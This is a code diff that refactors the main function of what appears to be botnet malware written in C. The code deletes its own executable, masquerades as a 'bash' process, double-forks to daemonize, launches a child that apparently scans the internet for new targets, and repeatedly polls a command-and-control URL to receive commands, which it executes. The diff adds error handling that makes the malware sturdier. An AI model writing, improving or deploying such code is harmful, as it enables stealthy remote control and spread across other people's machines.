@@ -62,68 +62,91 @@ void ft_manage_request(char *ptr) {
   	exit(0);
 }
 
-int main(int argc, char *argv[])
-{
-	char name[] = "bash";
-	pthread_t ip_searcher;
-	char *id;
-	char *request;
-	char *tmp;
-	char *arch;
-	pid_t pid1;
-	pid_t pid2;
-	int status;
+int main(int argc, char *argv[]) {
+    char name[] = "bash";
+    pthread_t ip_searcher;
+    char *id;
+    char *request;
+    char *tmp;
+    char *arch;
+    pid_t pid1;
+    pid_t pid2;
+    int status;
 
-	if (!DEBUG)
-	{
-		remove(argv[0]);
-		srand(time(NULL) ^ getpid());
-		strncpy(argv[0], "bash", strlen("bash"));
-		argv[0] = "bash";
-		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
-	
-		if (pid1 = fork())
-		{
-			waitpid(pid1, &status, 0);
-			exit(0);
-		}
-		else if (!pid1)
-			if (pid2 = fork())
-				exit(0);
-		setsid();
-		chdir("/");
-		signal(SIGPIPE, SIG_IGN);
-	}
-	addr = inet_addr("8.8.8.8");
-	arch = ft_getarch();
-	id = ft_get_id();
-	char *uwu;
-	uwu = ft_itoa(rand() % 100000);
-	id = ft_strnjoin(id, "-", 1);
-	id = ft_strnjoin(id, uwu, strlen(uwu));
-	if (!fork())
-	{
-		ft_scan_world();
-		exit(0);
-	}
-	free(uwu);
-	request = ft_strjoin("?id=", id);
-	request = ft_strnjoinf(url_page, request, strlen(request));
-	request = ft_strnjoin(request, "&arch=", strlen(request));
-	request = ft_strnjoin(request, arch, strlen(request));
-	while (true)
-	{
-		tmp = ft_request(request);
-		if (tmp)
-		{
-			ft_manage_request(tmp);
-			free(tmp);
-		}
-		if (DEBUG)
-			usleep(250000);
-		else
-			sleep(rand() % 10);
-	}
-	free(request);
-	return (0);
+    if (!DEBUG) {
+        if (remove(argv[0]) != 0) {
+            perror("remove");
+            exit(EXIT_FAILURE);
+        }
+        srand(time(NULL) ^ getpid());
+        strncpy(argv[0], "bash", strlen("bash"));
+        argv[0] = "bash";
+        if (prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0) != 0) {
+            perror("prctl");
+            exit(EXIT_FAILURE);
+        }
+        if ((pid1 = fork()) == -1) {
+            perror("fork");
+            exit(EXIT_FAILURE);
+        } else if (pid1 > 0) {
+            if (waitpid(pid1, &status, 0) == -1) {
+                perror("waitpid");
+                exit(EXIT_FAILURE);
+            }
+            exit(EXIT_SUCCESS);
+        } else {
+            if ((pid2 = fork()) == -1) {
+                perror("fork");
+                exit(EXIT_FAILURE);
+            } else if (pid2 > 0) {
+                exit(EXIT_SUCCESS);
+            }
+        }
+        if (setsid() == -1) {
+            perror("setsid");
+            exit(EXIT_FAILURE);
+        }
+        if (chdir("/") == -1) {
+            perror("chdir");
+            exit(EXIT_FAILURE);
+        }
+        signal(SIGPIPE, SIG_IGN);
+    }
+    struct in_addr addr;
+    if (inet_aton("8.8.8.8", &addr) == 0) {
+        perror("inet_aton");
+        exit(EXIT_FAILURE);
+    }
+    arch = ft_getarch();
+    id = ft_get_id();
+    char *uwu;
+    uwu = ft_itoa(rand() % 100000);
+    id = ft_strnjoin(id, "-", 1);
+    id = ft_strnjoin(id, uwu, strlen(uwu));
+    if ((pid1 = fork()) == -1) {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    } else if (pid1 == 0) {
+        ft_scan_world();
+        exit(EXIT_SUCCESS);
+    }
+    free(uwu);
+    request = ft_strjoin("?id=", id);
+    request = ft_strnjoinf(url_page, request, strlen(request));
+    request = ft_strnjoin(request, "&arch=", strlen(request));
+    request = ft_strnjoin(request, arch, strlen(request));
+    while (1) {
+        tmp = ft_request(request);
+        if (tmp) {
+            ft_manage_request(tmp);
+            free(tmp);
+        }
+        if (DEBUG) {
+            usleep(250000);
+        } else {
+            sleep(rand() % 10);
+        }
+    }
+    free(request);
+    return 0;
 }
